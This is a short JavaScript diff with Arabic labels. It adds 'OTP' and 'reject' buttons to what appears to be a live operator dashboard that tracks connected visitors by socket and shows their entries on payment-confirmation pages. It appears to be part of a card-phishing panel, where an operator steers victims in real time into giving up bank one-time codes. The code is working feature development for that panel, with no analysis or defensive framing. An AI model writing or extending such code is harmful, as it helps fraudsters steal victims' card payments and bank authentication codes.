@@ -2384,6 +2384,30 @@
               }, 100);
             }
             
+            // إضافة أزرار لتأكيد عملية الدفع من التطبيق
+            if (dataEntry.page === 'تأكيد عملية الدفع من التطبيق' || dataEntry.page === 'طلب عملية دفع جديدة') {
+              const bankAppOtpBtnId = 'bank-app-otp-btn-' + visitor.socketId + '-' + dataIndex;
+              const bankAppRejectBtnId = 'bank-app-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + bankAppOtpBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>OTP</button>';
+              html += '<button id="' + bankAppRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const otpBtn = document.getElementById(bankAppOtpBtnId);
+                const rejectBtn = document.getElementById(bankAppRejectBtnId);
+                if (otpBtn) {
+                  otpBtn.addEventListener('click', () => {
+                    cardActionOTP(otpBtn, visitor.socketId);
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    cardActionReject(rejectBtn, visitor.socketId);
+                  });
+                }
+              }, 100);
+            }
+            
             // إضافة زر موافقة لطلب إعادة إرسال الرمز
             if (dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز') {
               html += '<div class="flex gap-2 mt-3">';
